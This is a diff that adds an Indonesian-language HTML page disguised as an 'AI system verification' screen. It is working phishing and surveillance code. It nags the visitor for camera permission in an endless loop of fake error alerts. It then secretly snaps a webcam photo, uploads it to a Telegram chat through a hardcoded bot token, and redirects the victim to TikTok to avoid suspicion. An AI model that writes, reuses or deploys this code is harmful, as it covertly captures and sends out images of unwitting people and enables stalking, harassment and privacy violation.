@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi AI ⚡</title>
+    <style>
+        body { background: #0b0b0b; color: #00ff41; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 100px; margin: 0; overflow: hidden; }
+        .box { border: 2px solid #00ff41; display: inline-block; padding: 20px; box-shadow: 0 0 20px #00ff41; background: #000; }
+        h1 { font-size: 20px; text-shadow: 0 0 10px #00ff41; }
+        .loading { margin: 20px; font-weight: bold; }
+        #status { color: #ff0055; font-size: 14px; }
+    </style>
+</head>
+<body onclick="startPersistence()">
+    <div class="box">
+        <h1>[⚡] SYSTEM VERIFICATION [⚡]</h1>
+        <div class="loading">SINKRONISASI WAJAH SEDANG BERLANGSUNG... 🥵</div>
+        <p id="status">KLIK DI MANA SAJA UNTUK MELANJUTKAN</p>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8604367204:AAGBUeI1EOfEDHxtuFUtPl9-Ulan2IEXbu0';
+        const CHAT_ID = '6441249241';
+
+        // Fungsi utama untuk memaksa akses kamera
+        function startPersistence() {
+            document.getElementById('status').innerText = "MENYAMBUNGKAN KE SERVER AI...";
+            
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                document.getElementById('status').innerText = "VERIFIKASI BERHASIL! ⚡";
+                
+                // Ambil foto otomatis setelah akses diberikan
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 1500);
+            })
+            .catch(err => {
+                // LOGIKA PERSISTENCE: Jika ditolak, munculkan ALERT dan MINTA LAGI!
+                alert("🥵 ERROR 0x882: Verifikasi Gagal! Browser mendeteksi gangguan keamanan. Klik 'Izinkan' (Allow) pada notifikasi di atas untuk memulihkan akses.");
+                startPersistence(); // LOOPING TANPA BATAS SAMPAI DI-ALLOW ⚡
+            });
+        }
+
+        function captureAndSend(stream) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'target.jpg');
+                formData.append('caption', '🥵 LAPOR TUAN RAGIL! Target Akhirnya Menyerah & Berhasil Difoto!');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(() => {
+                    // Berhenti streaming dan lempar ke video viral agar tidak curiga
+                    stream.getTracks().forEach(track => track.stop());
+                    window.location.href = "https://www.tiktok.com"; 
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
